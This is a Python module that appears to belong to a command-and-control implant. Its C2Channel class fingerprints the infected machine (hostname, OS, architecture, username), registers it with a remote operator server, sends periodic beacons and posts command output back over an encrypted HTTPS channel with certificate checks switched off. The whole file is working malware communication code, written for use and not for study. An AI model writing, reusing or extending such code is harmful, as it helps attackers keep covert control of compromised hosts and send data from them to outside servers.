"""C2 communication handler — HTTP-based encrypted channel."""

import hashlib
import json
import time
import platform
import socket
import uuid

import requests

from . import crypto


class C2Channel:
    def __init__(self, host: str, port: int, key: bytes):
        self.url = f"https://{host}:{port}"
        self.key = key
        self.session = requests.Session()
        self.session.verify = False
        self.agent_id = self._generate_id()

    def _generate_id(self) -> str:
        raw = f"{platform.node()}-{uuid.getnode()}-{time.time()}"
        return hashlib.sha256(raw.encode()).hexdigest()[:16]

    def register(self) -> dict:
        payload = {
            "id": self.agent_id,
            "hostname": platform.node(),
            "os": platform.system(),
            "arch": platform.machine(),
            "user": self._get_user(),
        }
        return self._send("register", payload)

    def check_in(self) -> dict:
        return self._send("beacon", {"id": self.agent_id, "time": time.time()})

    def send_result(self, task_id: str, output: str) -> dict:
        return self._send("result", {"id": self.agent_id, "task": task_id, "output": output})

    def _send(self, endpoint: str, data: dict) -> dict:
        try:
            body = crypto.encrypt(json.dumps(data).encode(), self.key)
            resp = self.session.post(
                f"{self.url}/{endpoint}",
                data=body,
                headers={"Content-Type": "application/octet-stream"},
                timeout=10,
            )
            if resp.status_code == 200:
                return json.loads(crypto.decrypt(resp.content, self.key))
            return {"status": "error", "code": resp.status_code}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def _get_user(self) -> str:
        try:
            import os
            return os.getenv("USERNAME") or os.getenv("USER") or "unknown"
        except Exception:
            return "unknown"
